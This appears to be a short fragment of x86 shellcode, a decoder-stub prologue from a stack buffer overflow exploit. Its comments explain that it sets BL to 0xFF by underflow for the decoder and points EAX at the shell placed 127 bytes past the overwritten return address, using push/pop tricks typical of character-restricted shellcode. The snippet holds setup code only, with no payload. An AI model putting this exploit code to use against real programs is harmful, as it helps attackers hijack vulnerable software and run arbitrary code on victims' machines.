push 0
pop ebx
dec ebx #"underflow"- bl was 0x0. minus 1 is 0xFF. bl is ready for decoder
push esp
push 127
pop eax 
sub dword ptr [esp], eax #my shell starts 127 bytes after the overwriten return address
pop eax #eax is ready for the decoder
